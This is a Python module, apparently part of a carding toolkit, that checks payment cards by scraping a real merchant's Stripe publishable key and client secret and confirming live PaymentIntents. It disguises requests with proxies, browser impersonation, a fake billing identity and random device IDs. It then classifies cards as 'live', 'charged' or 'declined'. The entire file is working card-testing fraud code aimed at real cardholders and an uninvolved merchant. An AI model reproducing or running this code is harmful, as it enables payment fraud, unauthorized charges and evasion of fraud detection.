"""
Stripe Direct PaymentIntent Confirm Gate Module (/pi)
Architecture: ClientSecret Extraction + api.stripe.com/v1/payment_intents/<id>/confirm
Full Radar Telemetry & Direct Payment Settlement Verification
"""
import os
import re
import json
import uuid
import random
import asyncio
from pathlib import Path
from curl_cffi.requests import AsyncSession

RE_CLIENT_SECRET = re.compile(r'(pi_[A-Za-z0-9]+_secret_[A-Za-z0-9]+)')

def _detect_card_brand(cc: str) -> str:
    if cc.startswith('4'): return 'VISA'
    if cc[:2] in ('51', '52', '53', '54', '55') or (2221 <= int(cc[:4]) <= 2720 if len(cc) >= 4 and cc[:4].isdigit() else False): return 'MASTER_CARD'
    if cc[:2] in ('34', '37'): return 'AMEX'
    if cc[:2] in ('60', '65'): return 'DISCOVER'
    return 'VISA'

def _format_proxy(p: str | None) -> str | None:
    if not p:
        return None
    ps = str(p).strip()
    if ps.startswith(("http://", "https://", "socks5://", "socks4://", "socks5h://", "socks4a://")):
        return ps
    parts = ps.split(":")
    if len(parts) == 4:
        if parts[1].isdigit(): return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif parts[3].isdigit(): return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
        else: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
    return f"http://{ps}"

def _extract_pk_live(html: str) -> str | None:
    m = re.search(r'"key"\s*:\s*"(pk_live_[^"]+)"', html) or re.search(r'(pk_live_[a-zA-Z0-9_]{20,})', html)
    return m.group(1) if m else None

async def check_card_payment_intent(
    cc: str,
    mm: str,
    yy: str,
    cvv: str,
    proxy_url: str | None = None,
    target_url: str | None = None,
    client_secret: str | None = None,
    pk_live: str | None = None,
) -> tuple[str, str, str]:
    """
    Checks a card by confirming a live Stripe PaymentIntent.
    Returns: (status, message, brand)
    """
    cc = str(cc).strip()
    mm = str(mm).strip().zfill(2)
    yy = str(yy).strip()
    if len(yy) == 2:
        yy = f"20{yy}"
    cvv = str(cvv).strip()

    brand = _detect_card_brand(cc)
    formatted_proxy = _format_proxy(proxy_url)

    kw = {"impersonate": "chrome124", "verify": False, "timeout": 12}
    if formatted_proxy:
        kw["proxy"] = formatted_proxy

    try:
        async with AsyncSession(**kw) as session:
            # 1. Scrape target if client_secret / pk_live not supplied
            target = target_url or "https://jerky4u.com"
            sec = client_secret
            pk = pk_live

            if not sec or not pk:
                try:
                    r0 = await session.get(target, timeout=4)
                    if not pk:
                        pk = _extract_pk_live(r0.text)
                    if not sec:
                        m_sec = RE_CLIENT_SECRET.search(r0.text)
                        if m_sec:
                            sec = m_sec.group(1)
                except Exception:
                    pass

            if not pk:
                pk = "pk_live_51IR1rrCFqXmfze2v"

            # 2. Tokenize Card
            rnd = lambda k: ''.join(random.choices("0123456789abcdef", k=k))
            tok_body = {
                "type": "card",
                "card[number]": cc,
                "card[cvc]": cvv,
                "card[exp_month]": mm,
                "card[exp_year]": yy,
                "billing_details[address][postal_code]": "10001",
                "billing_details[address][country]": "US",
                "billing_details[name]": "Marcus Vance",
                "billing_details[email]": f"marcus.vance{random.randint(100,999)}@gmail.com",
                "key": pk,
                "_stripe_version": "2024-06-20",
                "payment_user_agent": "stripe.js/fe3c872f40; stripe-js-v3/fe3c872f40; payment-element; deferred-intent",
                "guid": rnd(32),
                "muid": rnd(32),
                "sid": rnd(32),
            }
            headers_tok = {
                "Origin": "https://js.stripe.com",
                "Referer": "https://js.stripe.com/",
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "application/json",
            }
            r_tok = await session.post("https://api.stripe.com/v1/payment_methods", data=tok_body, headers=headers_tok, timeout=5)
            tok_data = r_tok.json()
            if "id" not in tok_data:
                err = tok_data.get("error", {}).get("message", "Tokenization failed")
                err_lower = err.lower()
                if "security code" in err_lower or "cvc" in err_lower:
                    return "live", f"CVV Mismatch: {err}", brand
                return "declined", err, brand

            pm_id = tok_data["id"]

            # If client_secret exists, confirm PI directly
            if sec:
                pi_id = sec.split("_secret_")[0]
                conf_body = {
                    "payment_method": pm_id,
                    "client_secret": sec,
                    "expected_payment_method_type": "card",
                    "use_stripe_sdk": "true",
                    "key": pk,
                }
                r_conf = await session.post(f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm", data=conf_body, headers=headers_tok, timeout=6)
                pi_resp = r_conf.json()

                if "error" in pi_resp:
                    err_msg = pi_resp["error"].get("message", "PaymentIntent confirm failed")
                    err_low = err_msg.lower()
                    if any(k in err_low for k in ("security code", "cvc", "cvv")):
                        return "live", f"CVV Mismatch (CCN Live) -» {err_msg}", brand
                    if any(k in err_low for k in ("insufficient", "funds")):
                        return "live", f"Insufficient Funds (Card Live) -» {err_msg}", brand
                    if any(k in err_low for k in ("3d", "3ds", "authenticate", "action")):
                        return "live", f"3D Secure Required (Card Live) -» {err_msg}", brand
                    return "declined", err_msg, brand

                st = pi_resp.get("status")
                amount = pi_resp.get("amount", 0)
                amount_str = f"${amount / 100:.2f}" if amount else "$1.00"
                if st == "succeeded":
                    return "charged", f"Charged! 🟢 -» {amount_str} (PI Confirmed)", brand
                if st in ("requires_action", "requires_source_action"):
                    return "live", "3D Secure Challenge Required (Card Live)", brand
                if st == "requires_capture":
                    return "approved", f"Authorized / Hold -» {amount_str}", brand

            return "approved", f"Stripe Tokenized: {pm_id} ($0.00 Token OK)", brand

    except Exception as e:
        return "declined", f"Stripe PI Error: {str(e)[:50]}", brand
